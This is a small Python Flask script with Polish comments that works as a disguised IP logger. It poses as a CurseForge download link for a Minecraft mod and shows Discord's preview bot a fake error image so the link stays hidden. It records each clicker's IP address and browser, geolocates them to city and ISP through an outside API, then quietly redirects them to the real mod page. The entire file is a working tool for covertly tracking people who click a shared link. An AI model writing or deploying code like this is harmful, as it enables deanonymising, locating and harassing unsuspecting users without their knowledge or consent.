from flask import Flask, request, redirect, make_response
import requests
import sys

app = Flask(__name__)

# --- KONFIGURACJA ---
# Twój obrazek błędu (ten z tekstem "Failed to load")
ERROR_IMG = "https://i.imgur.com/8YvYv9S.png" 
# Prawdziwa strona moda
REAL_CURSEFORGE_LINK = "https://www.curseforge.com/minecraft/mc-mods/timeless-and-classics-zero/download/7401617"

@app.route('/download/7401617')
def logger():
    ua = request.headers.get('User-Agent', '')
    # Pobieranie IP z uwzględnieniem proxy Rendera
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]

    # Obsługa bota Discorda (podgląd obrazka)
    if "Discordbot" in ua or "externalhit" in ua.lower():
        response = make_response(redirect(ERROR_IMG))
        response.headers['Content-Type'] = 'image/png'
        return response

    # --- LOGOWANIE DANYCH (Wykonuje się przed przekierowaniem) ---
    print(f"\n[!!!] WYKRYTO KLIKNIĘCIE: {ip}")
    print(f"USER-AGENT: {ua}")
    
    try:
        # Próba pobrania lokalizacji
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city,isp", timeout=5).json()
        if r.get("status") == "success":
            print(f"LOKALIZACJA: {r.get('city')}, {r.get('country')}")
            print(f"ISP: {r.get('isp')}")
        else:
            print("BŁĄD API: Nie udało się pobrać dokładnej lokalizacji.")
    except Exception as e:
        print(f"BŁĄD POŁĄCZENIA Z API: {e}")

    # Wymuszenie pokazania logów w konsoli Rendera
    sys.stdout.flush()

    # --- PRZEKIEROWANIE DO CURSEFORGE ---
    return redirect(REAL_CURSEFORGE_LINK)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
